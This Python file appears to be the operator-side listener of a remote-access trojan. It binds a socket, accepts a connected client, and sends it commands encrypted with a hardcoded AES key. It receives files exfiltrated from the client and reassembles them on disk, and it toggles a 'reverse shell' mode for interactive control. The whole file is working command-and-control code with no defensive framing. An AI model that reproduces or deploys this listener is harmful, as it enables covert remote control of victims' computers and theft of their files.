# -*- coding: utf-8 -*-
import Crypto.Cipher.AES as aes
import os
import utils

from socket import socket

key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
host = "127.0.0.1"
port = 1005

reverse_shell_active = False

sock = socket()
sock.bind((host, port))

sock.listen(5)  # listen for client connection. The number stands for: number of unaccepted connections that the system will allow before refusing new connections
conn, addr = sock.accept()  # Establish connection with client. conn: new socket object used to send and receive data. addr address bound to the socket of the client.
print('Got connection from', addr)

while True:
    if reverse_shell_active:
        inpt = input("shell>")
    else:
        inpt = input("enter command:")
    conn.sendall(utils.encrypt(data=inpt.encode(utils.ENCODING)))

    recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
    if recv:
        msg = recv.decode(utils.ENCODING)

        if msg.startswith("file__"):
            filename, dtype, length = msg.split("__")[1:4]
            data = b""
            while recv != "done sending file".encode(utils.ENCODING):
                recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
                if recv:
                    data += recv
            print("while end")
            utils.convert_bytes_to_file(data=data, filename=filename+"."+dtype, path=".")
             
        elif msg == "terminated":
            print("terminated client. Good bye!")
            break
        elif msg == "reverse shell activated":
            reverse_shell_active = True
        elif msg == "reverse shell deactivated":
            reverse_shell_active = False
        else:
            print(msg)

conn.close()
print("Connection closed.")
